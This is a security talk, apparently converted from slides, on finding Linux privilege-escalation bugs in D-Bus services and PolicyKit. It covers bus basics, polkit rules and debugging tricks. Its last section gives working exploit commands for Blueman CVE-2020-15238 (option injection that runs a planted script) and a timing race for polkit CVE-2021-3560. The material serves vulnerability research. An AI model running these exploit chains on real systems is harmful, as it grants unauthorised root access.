# Ways for Web Dogs to Find Linux Privilege Escalation Vulnerabilities: Hunting Vulnerabilities of D-Bus Services

**Author:** Ricter Z @ 360 Noah Lab

## Agenda
- What is D-Bus?
- D-Bus Authentication and PolicyKit
- D-Bus Services Debug Tricks
- Common Exploits for Linux Privilege Escalation
- Real-World Examples: polkit CVE, etc.

## 1. What is D-Bus?

D-Bus is an Inter-Process Communication (IPC) and Remote Procedure Call (RPC) message bus framework. It provides a way for applications to communicate with each other and with the system.

### Types of Buses
- **System Bus**: Used by system-level applications and user applications.
- **Session Bus**: Used by user-level applications.

By default, `dbus-daemon` listens on a UNIX socket and extracts the user ID (UID) from incoming connections using `SO_PEERCRED`. TCP ports are also supported.

### System Services
```bash
root@server:/usr/share/dbus-1/system-services# ls -la
total 60
drwxr-xr-x 2 root root 4096 Apr  9 15:30 .
drwxr-xr-x 8 root root 4096 Apr 13 16:18 ..
-rw-r--r-- 1 root root 113 Mar 14 19:41 io.netplan.Netplan.service
-rw-r--r-- 1 root root 130 Sep 23  2020 org.freedesktop.PackageKit.service
-rw-r--r-- 1 root root 133 Feb 21 20:58 org.freedesktop.PolicyKit1.service
-rw-r--r-- 1 root root 114 Dec 10  2019 org.freedesktop.UPower.service
-rw-r--r-- 1 root root 424 Apr  2  2020 org.freedesktop.hostname1.service
-rw-r--r-- 1 root root 455 Apr  2  2020 org.freedesktop.locale1.service
-rw-r--r-- 1 root root 453 Apr  2  2020 org.freedesktop.login1.service
-rw-r--r-- 1 root root 457 Apr  2  2020 org.freedesktop.network1.service
-rw-r--r-- 1 root root 457 Apr  2  2020 org.freedesktop.resolve1.service
```

### Example Service Configuration
```bash
root@server:/usr/share/dbus-1/system-services# cat org.freedesktop.UPower.service
[D-BUS Service]
Name=org.freedesktop.UPower
Exec=/usr/lib/upower/upowerd
User=root
SystemdService=upower.service
```

### D-Bus Components
- **Object Path**: Identifier within an application.
- **Interfaces**: Define properties, methods, and signals supported by D-Bus.
- **Methods**: Server-side attack vectors.
- **Properties**: Server-side attack vectors.
- **Signals**: Publish-subscribe mechanism, client-side attack vectors.

### Introspection
```bash
$ gdbus introspect --system -d org.freedesktop.DBus -o /
node / {
interface org.freedesktop.DBus {
methods:
Hello(out s arg_0);
RequestName(in  s arg_0, in  u arg_1, out u arg_2);
signals:
NameOwnerChanged(s arg_0, s arg_1, s arg_2);
properties:
readonly as Features;
};
};
```

## 2. D-Bus Authentication and PolicyKit

PolicyKit is an authentication API that allows fine-grained control over system actions. The process involves:

1. Subject sends requests to the Mechanism.
2. Mechanism sends action ID and subject information to PolicyKit.
3. PolicyKit checks if the subject has privileges for the action.
4. PolicyKit returns the result.
5. Mechanism acts based on the result.

### Example PolicyKit Configuration
```bash
$ cat polkit.policy
no
auth_admin
yes
Action ID
• yes: Authorized
• no: Not authorized
• auth_admin: Authentication by an admin user
• auth_self: Authentication by the session owner
• allow_inactive: ignored
• allow_active: ignored
• allow_any: applies to any client (console, SSH, VNC)
```

### Custom PolicyKit Rule
```bash
polkit.addRule(function(action, subject) {
if (action.id == "org.freedesktop.fwupd.update-internal" &&
subject.active == true && subject.local == true &&
subject.isInGroup("sudo")) {
return polkit.Result.YES;
}
});
```

### Finding Targets
- **Universal Vulnerabilities**:
  - Service allows unprivileged users to send requests.
  - Action has a "yes" tag.
  - No "privileged" related annotations.
- **Environment-Specific Vulnerabilities**:
  - Check user group and session locality.

### Client-Side Attack
- **Process Running as Root**: Does not check the sender.
- **Example**:
  ```bash
  $ dbus-send --dest=org.freedesktop.DBus /... org.freedesktop.DBus.Debug.Stats.GetAllMatchRules | grep -v sender
  dict entry(
  string ":1.14"
  array [
  string "type='signal',interface='org.freedesktop.DBus.Local'"
  ]
  )
  ```

## 3. D-Bus Services Debug Tricks

- **Debugging**:
  - Use `export DEBUG=1` to print debug logs.
  - Use `strace` to trace system calls.
  - Add `printf()` statements in source code and recompile.
  - Consider services written in C/C++, Go, or Python.

### Example
```bash
$ G_MESSAGES_DEBUG=all polkitd -r
$ dbus-service -h
# /usr/lib/upower/upowerd -h
Usage:
upowerd [OPTION?] upower daemon
Help Options:
-h, --help           Show help options
Application Options:
--timed-exit         Exit after a small delay
--immediate-exit     Exit after the engine has loaded
-r, --replace        Replace the old daemon
-v, --verbose        Show extra debugging information
```

## 4. Common Exploits for Linux and Real-World Examples

### Common Exploits
- Command/option injection
- Setting environment variables
- Loading shared libraries
- Writing data to files
- Race conditions
- Importing Python modules
- Path traversal
- Logic bugs
- Symbolic link tricks
- Memory corruption
- Use-after-free

### Example: Blueman CVE-2020-15238
```bash
$ ./CVE-2020-15238-blueman
COMMANDS =  [["dhcpcd", "-m", "100"],]
self._command = [path] + command[1:] + [self._interface]
self._client = subprocess.Popen(self._command)
```

### Exploit Chain
```bash
$ echo $'#!/bin/bash\nid > /tmp/pwned' > /tmp/eye
$ chmod +x /tmp/eye
$ dbus-send --print-reply --system --dest=org.blueman.Mechanism /org/blueman/mechanism org.blueman.Mechanism.DhcpClient string:"-c/tmp/eye"
```

### Example: Polkit CVE-2021-3560
```bash
# G_MESSAGES_DEBUG=all /usr/lib/policykit-1/polkitd –r
** (polkitd:69010): DEBUG: 01:36:20.944: checking whether system-bus-name::1.18816 is authorized for org.freedesktop.timedate1.set-time
** (polkitd:69010): DEBUG: 01:36:20.945: is authorized (implied by org.freedesktop.timedate1.set-time)
$ dbus-send --print-reply --system --dest=org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1.SetTimezone string:Asia/Chongqing boolean:true & sleep 0.02; kill $!
```

### Exploitation Steps
1. Register a normal AuthenticationAgent.
2. Respond with correct data for incoming authentication requests.
3. Kill self after sending `AuthenticationAgentResponse2`.
4. PolicyKit will think the request is from a root user.
5. `CheckAuthorization` will return `True`.
6. The action will be allowed.

## References
- [DBus and Polkit Overview](https://venam.nixers.net/blog/unix/2020/07/06/dbus-polkit.html)
- [FreeDesktop.org D-Bus Documentation](https://www.freedesktop.org/wiki/Software/dbus/)
- [txDBus D-Bus Overview](https://pythonhosted.org/txdbus/dbus_overview.html)
- [Exploring the Linux IPC Attack Surface](https://i.blackhat.com/EU-21/Wednesday/EU-21-Backhouse-Message-in-a-Broken-Bottle-Exploring-the-Linux-IPC-Attack-Surface.pdf)

---

This document provides a structured and detailed guide to understanding and exploiting D-Bus services for privilege escalation on Linux systems.